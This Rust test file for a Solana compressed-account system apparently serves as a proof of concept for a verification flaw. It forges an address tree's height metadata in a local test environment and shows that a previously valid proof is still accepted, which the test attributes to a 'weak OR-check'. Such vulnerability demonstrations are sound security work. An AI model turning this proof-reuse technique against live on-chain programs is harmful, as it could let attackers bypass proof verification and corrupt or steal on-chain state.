#![cfg(feature = "test-sbf")]

use std::collections::HashMap;

use anchor_lang::prelude::borsh::{BorshDeserialize, BorshSerialize};
use create_address_test_program::create_invoke_cpi_instruction;
use light_batched_merkle_tree::{
    constants::{DEFAULT_BATCH_ADDRESS_TREE_HEIGHT, DEFAULT_BATCH_STATE_TREE_HEIGHT},
    initialize_address_tree::InitAddressTreeAccountsInstructionData,
    initialize_state_tree::InitStateTreeAccountsInstructionData,
    merkle_tree_metadata::BatchedMerkleTreeMetadata,
};
use light_client::{indexer::AddressWithTree, rpc::Rpc};
use light_compressed_account::{
    address::{
        derive_address, pack_read_only_address_params, pack_read_only_accounts,
    },
    compressed_account::{MerkleContext, ReadOnlyCompressedAccount},
    TreeType,
    instruction_data::{with_readonly::InstructionDataInvokeCpiWithReadOnly, compressed_proof::CompressedProof},
    Pubkey as LcPubkey,
};
use light_compressed_token::process_transfer::transfer_sdk::to_account_metas;
use light_program_test::{
    indexer::TestIndexer, program_test::TestRpc, LightProgramTest, ProgramTestConfig,
};
use light_prover_client::prover::{spawn_prover, ProverConfig};
use light_sdk::address::ReadOnlyAddress;
use serial_test::serial;
use solana_sdk::{pubkey::Pubkey, signature::Keypair, signer::Signer};
use anchor_lang::Discriminator;
use light_program_test::Indexer;

use light_compressed_account::instruction_data::data::pack_pubkey_usize;


#[tokio::test]
#[serial]
async fn reuse_proof_with_readonly() {
    // set up program-test with batched v2 trees
    spawn_prover(ProverConfig::default()).await;
    let mut config = ProgramTestConfig::default_with_batched_trees(false);
    config.with_prover = false;
    config.v2_state_tree_config = Some(InitStateTreeAccountsInstructionData::default());
    config.v2_address_tree_config = Some(InitAddressTreeAccountsInstructionData::test_default());
    config.additional_programs =
        Some(vec![("create_address_test_program", create_address_test_program::ID)]);
    let mut rpc = LightProgramTest::new(config).await.unwrap();
    let env = rpc.test_accounts.clone();
    let payer: Keypair = rpc.get_payer().insecure_clone();

    // grab tree keys and assert default heights
    let state_tree_pk = env.v2_state_trees[0].merkle_tree;
    let addr_tree_pk  = env.v2_address_trees[0];
    let state_meta = {
        let acc = rpc.get_account(state_tree_pk).await.unwrap().unwrap();
        let mut s: &[u8] = &acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
        BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap()
    };
    let addr_meta = {
        let acc = rpc.get_account(addr_tree_pk).await.unwrap().unwrap();
        let mut s: &[u8] = &acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
        BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap()
    };
    assert_eq!(state_meta.height, DEFAULT_BATCH_STATE_TREE_HEIGHT);
    assert_eq!(addr_meta.height, DEFAULT_BATCH_ADDRESS_TREE_HEIGHT);

    // build a proof for a derived address; extract both root indices
    let mut indexer = TestIndexer::init_from_acounts(&payer, &env, 0).await;
    let seed = [3u8; 32];
    let derived_addr = derive_address(
        &seed,
        &addr_tree_pk.to_bytes(),
        &create_address_test_program::ID.to_bytes(),
    );
    let proof_ctx = indexer
        .get_validity_proof(Vec::new(), vec![AddressWithTree {
            address: derived_addr,
            tree: addr_tree_pk,
        }], None)
        .await
        .unwrap()
        .value;
    let addr_root_idx  = proof_ctx.get_address_root_indices()[0];
    /*
    let state_root_idx = proof_ctx
        .get_root_indices()
        .first()
        .and_then(|x| *x)
        .expect("missing state root index"); */

    // new (works for a fresh test state tree)
    let state_root_idx: u16 = 0;

    // prepare remaining_accounts and pack read-only contexts
    

// --- PRE-REGISTER metas in a fixed order ---
// This ensures the indices are 0,1,2 in the order the program expects.
let state_queue_pk = env.v2_state_trees[0].output_queue;
let mut remaining_accounts: HashMap<LcPubkey, usize> = HashMap::new();
let st_idx = pack_pubkey_usize(&state_tree_pk.into(),  &mut remaining_accounts); // 0
let sq_idx = pack_pubkey_usize(&state_queue_pk.into(), &mut remaining_accounts); // 1
let at_idx = pack_pubkey_usize(&addr_tree_pk.into(),   &mut remaining_accounts); // 2

eprintln!("pre-registered indices: state_tree={}, state_queue={}, addr_tree={}", st_idx, sq_idx, at_idx);

// --- Build read-only address (must point to addr_tree index = at_idx) ---
let ro_address = ReadOnlyAddress {
    address: derived_addr,
    address_merkle_tree_pubkey: addr_tree_pk.into(),
    address_merkle_tree_root_index: addr_root_idx,
};
let packed_ro_addresses = pack_read_only_address_params(&[ro_address], &mut remaining_accounts);
{
    let mut dbg_idx: Vec<(Pubkey, usize)> = remaining_accounts
        .iter().map(|(k, v)| (Pubkey::from(*k), *v)).collect();
    dbg_idx.sort_by_key(|(_, idx)| *idx);
    eprintln!("--- final index map after packing ---");
    for (pk, idx) in dbg_idx {
        eprintln!("[{idx}] {pk}");
    }
}
// --- Build read-only STATE account (must point to state_tree=st_idx, queue=sq_idx) ---
let ro_state = ReadOnlyCompressedAccount {
    account_hash: [0u8; 32], // unused when prove_by_index=false
    merkle_context: MerkleContext {
        merkle_tree_pubkey: state_tree_pk.into(),
        queue_pubkey: state_queue_pk.into(),
        leaf_index: 0,
        prove_by_index: false,
        tree_type: light_compressed_account::TreeType::StateV2,
    },
    root_index: state_root_idx,   // use 0 for fresh tree, as discussed
};
let packed_ro_states = pack_read_only_accounts(&[ro_state], &mut remaining_accounts);
{
    let mut dbg_idx: Vec<(Pubkey, usize)> = remaining_accounts
        .iter().map(|(k, v)| (Pubkey::from(*k), *v)).collect();
    dbg_idx.sort_by_key(|(_, idx)| *idx);
    eprintln!("--- final index map after packing ---");
    for (pk, idx) in dbg_idx {
        eprintln!("[{idx}] {pk}");
    }
}
let max_idx = remaining_accounts.values().max().cloned().unwrap_or(0);
assert!(max_idx <= 2, "packer inserted unexpected pubkeys; add them to metas first");

// --- Convert to AccountMetas (order by index ascending) ---
let remaining_map: HashMap<Pubkey, usize> = remaining_accounts
    .into_iter()
    .map(|(k, v)| (Pubkey::from(k), v))
    .collect();
let remaining_metas = to_account_metas(remaining_map);

// Debug: show final metas order
eprintln!("--- remaining_metas (order passed) ---");
for (i, m) in remaining_metas.iter().enumerate() {
    eprintln!("#{}: {} (writable={}, signer={})", i, m.pubkey, m.is_writable, m.is_signer);
}
assert!(
    remaining_metas.len() >= 3,
    "expected at least 3 metas: state_tree, state_queue, addr_tree"
);
let proof_opt: Option<CompressedProof> = proof_ctx.proof.into();


    // build the InvokeCpiWithReadOnly instruction payload
    let ix_data = InstructionDataInvokeCpiWithReadOnly {
        mode: 0,
        bump: 255,
        invoking_program_id: create_address_test_program::ID.into(),
        compress_or_decompress_lamports: 0,
        is_compress: false,
        with_cpi_context: false,
        with_transaction_hash: false,
        cpi_context: Default::default(),
        proof: proof_opt,
        new_address_params: Vec::new(),
        input_compressed_accounts: Vec::new(),
        output_compressed_accounts: Vec::new(),
        read_only_addresses: packed_ro_addresses,
        read_only_accounts: packed_ro_states,
    };
    // prefix with discriminant for read-only CPI
    let raw_ix_data = [
        light_system_program::instruction::InvokeCpiWithReadOnly::DISCRIMINATOR.to_vec(),
        ix_data.try_to_vec().unwrap(),
    ]
    .concat();
    let instruction = create_invoke_cpi_instruction(
        payer.pubkey(),
        raw_ix_data,
        remaining_metas.clone(),
        None,
    );

    // baseline submission
    let res_before = TestRpc::create_and_send_transaction_with_batched_event(
        &mut rpc,
        &[instruction.clone()],
        &payer.pubkey(),
        &[&payer],
        None,
    )
    .await;
    assert!(res_before.is_ok(), "baseline verification failed");

    // forge the address-tree height to 1; leave state height untouched
    let mut forged_addr = rpc.get_account(addr_tree_pk).await.unwrap().unwrap();
    let mut slice: &[u8] = &forged_addr.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    let mut meta = BatchedMerkleTreeMetadata::deserialize(&mut slice).unwrap();
    meta.height = 1; // forge
    let mut serialized = Vec::new();
    BatchedMerkleTreeMetadata::serialize(&meta, &mut serialized).unwrap();
    forged_addr.data[8..8 + serialized.len()].copy_from_slice(&serialized);
    rpc.set_account(addr_tree_pk, forged_addr);

    // reuse the *same* proof/instruction; OR‑guard allows it because state height==32
    let res_after = TestRpc::create_and_send_transaction_with_batched_event(
        &mut rpc,
        &[instruction],
        &payer.pubkey(),
        &[&payer],
        None,
    )
    .await;
    assert!(
        res_after.is_ok(),
        "reuse after forging address height should succeed due to weak OR‑check"
    );
}
